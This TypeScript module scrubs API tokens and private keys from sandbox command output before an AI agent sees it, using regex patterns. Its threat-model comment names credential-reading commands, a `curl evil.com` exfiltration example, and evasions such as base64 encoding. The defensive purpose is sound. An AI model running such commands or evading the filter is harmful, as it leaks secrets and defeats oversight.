/**
 * Secret redaction for sandbox tool outputs.
 *
 * Threat model: anything that runs inside the sandbox can be asked to read any
 * file or env var (e.g. `cat ~/.ssh/id_rsa`, `printenv GH_TOKEN`,
 * `cat ~/.git-credentials`). Sandbox-side network egress is locked down so
 * direct exfil via `curl evil.com` is blocked, but the call-side
 * (sandbox-run -> stdout -> agent context -> respond-to-user / logs) is a
 * valid channel for indirect exfil. This module scrubs known secret patterns
 * from the stdout / stderr / file-content strings before they reach the agent.
 *
 * Defense-in-depth only:
 *   - Catches accidental leaks (agent echoes a token, error stack includes env,
 *     model copies a fragment into its reply, log lines contain raw values).
 *   - Does NOT stop a determined attacker who base64-encodes, splits across
 *     calls, or otherwise obfuscates. The real defense against that is
 *     short-lived credentials (GitHub App installation tokens, per-session BB
 *     deploy keys) so the exfilled value is worthless by the time it's reused.
 *
 * Patterns intentionally favour false positives over false negatives — a
 * legitimately-mentioned token shape gets [REDACTED_*] in the agent's view,
 * which is acceptable. We never want a real secret to slip through.
 */

const PATTERNS: Array<{ re: RegExp; tag: string }> = [
  // GitHub classic PAT (40 chars after prefix). Kept loose on length to also
  // match the ghp_… preview shown by GitHub during creation.
  { re: /\bghp_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_PAT_CLASSIC]" },
  // GitHub fine-grained PAT (~76 chars after prefix).
  { re: /\bgithub_pat_[A-Za-z0-9_]{60,}\b/g, tag: "[REDACTED_GITHUB_PAT_FINEGRAINED]" },
  // GitHub App installation token. Short-lived but still worth scrubbing.
  { re: /\bghs_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_INSTALLATION_TOKEN]" },
  // GitHub OAuth user-to-server tokens (gho_) and refresh tokens (ghr_).
  { re: /\bgho_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_OAUTH]" },
  { re: /\bghr_[A-Za-z0-9_]{30,}\b/g, tag: "[REDACTED_GITHUB_REFRESH]" },
  // Bitbucket Server / Data Center HTTP access tokens. Two known prefixes.
  { re: /\bBBDC-[A-Za-z0-9+/=]{20,}\b/g, tag: "[REDACTED_BITBUCKET_TOKEN]" },
  // Bitbucket Cloud App Passwords / API tokens (ATATT/ATBB).
  { re: /\bATAT[A-Z][A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_ATLASSIAN_API_TOKEN]" },
  { re: /\bATBB[A-Za-z0-9+/=]{20,}\b/g, tag: "[REDACTED_BITBUCKET_APP_PASSWORD]" },
  // Slack tokens (xoxb-, xoxp-, xoxa-, xoxs-).
  { re: /\bxox[abprs]-[A-Za-z0-9-]{10,}\b/g, tag: "[REDACTED_SLACK_TOKEN]" },
  // OpenAI / Anthropic / Grafana-style sk-… tokens. Conservative bound
  // because plain "sk-" prefix is too common; require at least 32 chars after.
  { re: /\bsk-[A-Za-z0-9_-]{32,}\b/g, tag: "[REDACTED_LLM_API_KEY]" },
  // Google service account / OAuth tokens.
  { re: /\bya29\.[A-Za-z0-9_-]{20,}\b/g, tag: "[REDACTED_GOOGLE_OAUTH]" },
  // AWS access key id + secret access key.
  { re: /\bAKIA[0-9A-Z]{16}\b/g, tag: "[REDACTED_AWS_ACCESS_KEY_ID]" },
  // Generic PEM-encoded private keys (ssh-rsa, ed25519, ecdsa, openssh, etc.).
  // Multi-line; uses [\s\S] to span newlines.
  {
    re: /-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----[\s\S]+?-----END [A-Z0-9 ]*PRIVATE KEY-----/g,
    tag: "[REDACTED_PRIVATE_KEY]",
  },
];

/**
 * Run all known secret patterns over `text` and replace each match with a
 * tagged placeholder. Returns the same input untouched if no matches.
 */
export function redactSecrets(text: string): string {
  if (!text) return text;
  let out = text;
  for (const { re, tag } of PATTERNS) {
    out = out.replace(re, tag);
  }
  return out;
}

/**
 * Convenience: redact stdout/stderr fields in a result object then JSON.stringify.
 * Use at every sandbox tool return site that pipes raw command output back.
 */
export function redactAndStringify(obj: Record<string, unknown>): string {
  const redacted: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(obj)) {
    redacted[k] = typeof v === "string" ? redactSecrets(v) : v;
  }
  return JSON.stringify(redacted);
}
